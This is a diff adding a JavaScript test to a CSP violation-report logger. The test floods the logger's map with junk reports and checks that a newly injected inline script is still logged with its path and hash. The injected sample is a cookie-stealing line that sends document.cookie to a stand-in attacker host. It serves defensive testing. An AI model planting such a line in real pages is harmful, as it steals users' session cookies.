@@ -468,6 +468,43 @@ test('W6: junk keys minted in an earlier window cannot refill the map and hide a
   assert.equal(fresh.pathGroup, '/news/*', 'the slots kept for never-seen keys give it its full identity, not just a coarse one')
 })
 
+test('W9: pre-seeded junk + 5 networks filling the map cannot hide a NEW inline script — it gets a first line with its path and sample hash', async () => {
+  const portalInline = legacyReport({ 'blocked-uri': 'inline', 'script-sample': 'window.__NUXT__={};window.__NUXT__.con', 'document-uri': 'https://portal.example.vn/news/a' })
+  const sendJunk = async () => {
+    for (let network = 0; network < 20; network += 1) {
+      for (let key = 0; key < 20; key += 1) {
+        await send(CSP_REPORT_PATH, browserHeaders(`10.${100 + network}.0.1`, LEGACY), legacyReport({ 'blocked-uri': `https://seed-${network}-${key}.example/x.js` }))
+      }
+    }
+  }
+  // Hour 1: 400 junk keys become "known"; the portal's own inline script makes the coarse
+  // key script-src-elem|inline|report known too — as it always is in production.
+  await sendJunk()
+  await send(CSP_REPORT_PATH, browserHeaders('10.180.0.1', LEGACY), portalInline)
+  cspViolationLog.flush()
+  // Hour 2: the known junk takes its 400 slots, 5 networks spend their budget on 100 new
+  // junk keys — the main map is full.
+  await sendJunk()
+  await send(CSP_REPORT_PATH, browserHeaders('10.180.0.1', LEGACY), portalInline)
+  for (let network = 0; network < 5; network += 1) {
+    for (let key = 0; key < 20; key += 1) {
+      await send(CSP_REPORT_PATH, browserHeaders(`10.${130 + network}.0.1`, LEGACY), legacyReport({ 'blocked-uri': `https://fill-${network}-${key}.example/x.js` }))
+    }
+  }
+  lines.length = 0
+  await send(CSP_REPORT_PATH, browserHeaders('10.190.0.1', LEGACY), legacyReport({
+    'blocked-uri': 'inline',
+    'script-sample': 'fetch("https://evil.example/?c="+document.cookie)',
+    'document-uri': 'https://portal.example.vn/news/bai-bi-chen?x=1',
+  }))
+  const injected = violations().find(line => line.sampleSha256 === samplePrefix('fetch("https://evil.example/?c="+document.cookie)'))
+  assert.ok(injected, 'the injected inline script was only counted under the known coarse key — its identity was lost')
+  assert.deepEqual(
+    [injected.kind, injected.directive, injected.blocked, injected.path, injected.pathGroup],
+    ['first', 'script-src-elem', 'inline', '/news/bai-bi-chen', '/news/*'],
+  )
+})
+
 test('W7: a known key across 3 windows → exactly one first line in total, then one repeats line per window', async () => {
   const report = legacyReport({ 'blocked-uri': 'inline', 'script-sample': 'three-windows' })
   const perWindow = [3, 4, 4]
